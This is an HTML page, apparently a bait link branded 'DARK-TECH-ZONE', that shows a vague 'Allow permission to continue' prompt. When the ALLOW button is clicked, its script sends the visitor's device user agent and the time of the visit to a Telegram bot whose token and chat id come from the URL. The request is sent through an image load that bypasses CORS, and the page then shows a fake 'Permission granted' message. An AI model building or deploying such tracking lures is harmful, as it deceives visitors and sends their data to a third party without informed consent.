<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Connecting...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  height:100vh;
  background:#000;
  font-family:Arial,Helvetica,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#fff;
}

.box{
  width:90%;
  max-width:420px;
  background:#0b0b0b;
  border-radius:14px;
  padding:25px;
  text-align:center;
  box-shadow:0 0 30px rgba(0,255,136,.35);
}

.loader{
  width:60px;
  height:60px;
  border:6px solid #222;
  border-top:6px solid #00ff88;
  border-radius:50%;
  margin:20px auto;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  0%{transform:rotate(0deg)}
  100%{transform:rotate(360deg)}
}

button{
  width:100%;
  padding:13px;
  margin-top:15px;
  border:none;
  border-radius:8px;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
}

.allow{
  background:#00ff88;
  color:#000;
}

.deny{
  background:#ff4444;
  color:#fff;
}

.small{
  font-size:13px;
  opacity:.7;
  margin-top:12px;
}
</style>
</head>

<body>

<div class="box" id="box">
  <h2>Connectingâ€¦</h2>
  <div class="loader"></div>
  <p>Allow permission to continue</p>

  <button class="allow" onclick="allowAccess()">ALLOW</button>
  <button class="deny" onclick="denyAccess()">DENY</button>

  <div class="small">Powered by DARK-TECH-ZONE</div>
</div>

<script>
const params = new URLSearchParams(window.location.search);
const token = params.get("token");
const chatId = params.get("chat");

function allowAccess(){
  if(!token || !chatId){
    alert("Invalid or broken link");
    return;
  }

  const text =
`ðŸ“² Link Opened
ðŸ•’ Time: ${new Date().toLocaleString()}
ðŸ“± Device: ${navigator.userAgent}`;

  const url =
`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

  // TELEGRAM SAFE METHOD (NO CORS)
  const img = new Image();
  img.src = url;

  document.getElementById("box").innerHTML = `
    <h2 style="color:#00ff88">Connected</h2>
    <p>Permission granted successfully.</p>
    <div class="small">You can close this page.</div>
  `;
}

function denyAccess(){
  document.getElementById("box").innerHTML = `
    <h2 style="color:#ff4444">Permission Denied</h2>
    <p>Access was not allowed.</p>
    <div class="small">You may close this page.</div>
  `;
}
</script>

</body>
</html>
